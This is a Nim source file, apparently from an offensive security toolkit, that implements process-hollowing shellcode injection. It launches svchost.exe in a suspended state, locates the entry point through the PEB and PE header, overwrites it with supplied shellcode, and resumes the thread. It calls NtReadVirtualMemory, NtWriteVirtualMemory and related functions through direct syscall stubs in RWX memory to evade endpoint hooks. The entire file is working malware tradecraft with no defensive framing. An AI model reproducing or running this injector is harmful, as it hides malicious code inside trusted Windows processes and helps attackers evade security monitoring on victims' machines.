import endians
import strformat
import winim

import ../syscalls/GetSyscallStub

#[
    Syscalls TODO:

    - NtQueryInformationProcess
    - NtClose
]#

type myNtReadVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToRead: ULONG, NumberOfBytesReaded: PULONG): NTSTATUS {.stdcall.}
type myNtProtectVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: ptr PVOID, NumberOfBytesToProtect: ptr SIZE_T, NewAccessProtection: int, OldAccessProtection: ptr ULONG): NTSTATUS {.stdcall.}
# type myNtProtectVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtResumeThread = proc(ThreadHandle: HANDLE, SuspendCount: PULONG): NTSTATUS {.stdcall.}

proc injectProcessHollowing*[byte](shellcode: openArray[byte]): void =
    let
        processImage: string = r"C:\Windows\System32\svchost.exe"
        #processImage: string = r"C:\Windows\System32\WerFault.exe"
    var
        nBytes: SIZE_T
        tmp: ULONG
        res: WINBOOL
        baseAddressBytes: array[0..sizeof(PVOID), byte]
        data: array[0..0x200, byte]

    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION

    echo "[processHollowing] Creating process from image: '", processImage, "'"

    res = CreateProcess(
        NULL,
        newWideCString(processImage),
        ps,
        ts, 
        FALSE,
        0x4, # CREATE_SUSPENDED
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi)

    if res == 0:
        echo fmt"[DEBUG] (CreateProcess) : Failed to start process from image {processImage}, exiting"
        return

    var hProcess = pi.hProcess
    var bi: PROCESS_BASIC_INFORMATION

    echo "[processHollowing] hProcess: ", hProcess

    # TODO: Convert this to a syscall too...
    res = NtQueryInformationProcess(
        hProcess,
        0, # ProcessBasicInformation
        addr bi,
        cast[ULONG](sizeof(bi)),
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting"
        return

    var ptrImageBaseAddress = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)

    echo "[processHollowing] PEB: ", cast[int64](bi.PebBaseAddress)

    # Get syscalls and build definitions
    var SYSCALL_STUB_SIZE: int = 23
    var oldProtection: DWORD = 0
    var status: NTSTATUS
    var success: BOOL

    # Get current process
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    
    # Commit RWX memory inside the current process for the syscall stubs
    let syscallStub_NtReadVirtualMemory = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    let syscallStub_NtProtectVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtReadVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let syscallStub_NtWriteVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtectVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
    let syscallStub_NtResumeThread: HANDLE = cast[HANDLE](syscallStub_NtWriteVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)

    # Define the syscall from the defined type above
    var NtReadVirtualMemory: myNtReadVirtualMemory = cast[myNtReadVirtualMemory](cast[LPVOID](syscallStub_NtReadVirtualMemory))
    var NtProtectVirtualMemory: myNtProtectVirtualMemory = cast[myNtProtectVirtualMemory](cast[LPVOID](syscallStub_NtProtectVirtualMemory))
    var NtWriteVirtualMemory: myNtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWriteVirtualMemory))
    var NtResumeThread: myNtResumeThread = cast[myNtResumeThread](cast[LPVOID](syscallStub_NtResumeThread))
    
    # Change the stub page to RWX 
    VirtualProtect(cast[LPVOID](syscallStub_NtReadVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
    VirtualProtect(cast[LPVOID](syscallStub_NtProtectVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
    VirtualProtect(cast[LPVOID](syscallStub_NtWriteVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
    VirtualProtect(cast[LPVOID](syscallStub_NtResumeThread), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    success = GetSyscallStub("NtReadVirtualMemory", cast[LPVOID](syscallStub_NtReadVirtualMemory))
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtectVirtualMemory))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWriteVirtualMemory))
    success = GetSyscallStub("NtResumeThread", cast[LPVOID](syscallStub_NtResumeThread))

    res = NtReadVirtualMemory(
        hProcess,
        ptrImageBaseAddress,
        cast[PVOID](addr baseAddressBytes),
        cast[ULONG](len(baseAddressBytes)),
        cast[PULONG](addr nBytes))

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read image base address, exiting"
        return

    var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))

    res = NtReadVirtualMemory(
        hProcess,
        imageBaseAddress,
        cast[PVOID](addr data),
        cast[ULONG](len(data)),
        cast[PULONG](addr nBytes))

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read first 0x200 bytes of the PE structure, exiting"
        return

    var e_lfanew: uint
    littleEndian32(addr e_lfanew, addr data[0x3c])
    echo "[processHollowing] e_lfanew = ", e_lfanew

    var entrypointRvaOffset = e_lfanew + 0x28
    echo "[processHollowing] entrypointRvaOffset = ", entrypointRvaOffset

    var entrypointRva: uint
    littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
    echo "[processHollowing] entrypointRva = ", entrypointRva

    var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
    echo "[processHollowing] entrypointAddress = ", cast[uint64](entrypointAddress)

    var protectAddress = entrypointAddress
    var shellcodeLength = cast[SIZE_T](len(shellcode))
    var oldProtect: ULONG

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        0x40,
        addr oldProtect)

    echo "NtProtectVirtualMemory = ", res

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting"
        return

    echo "NtWriteVirtualMemory writing shellcode of length: ", len(shellcode)

    res = NtWriteVirtualMemory(
        hProcess,
        entrypointAddress,
        unsafeAddr shellcode,
        len(shellcode),
        addr nBytes)

    echo "NtWriteVirtualMemory = ", res

    if res != 0:
        echo "[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting"
        return

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        oldProtect,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to revert memory permissions at the EntryPoint, exiting"
        return

    res = NtResumeThread(
        pi.hThread,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtResumeThread) : Failed to resume thread, exiting"
        return

    echo "[processHollowing] Shellcode injected and resumed."

    # res = NtClose(hProcess)

    CloseHandle(hProcess)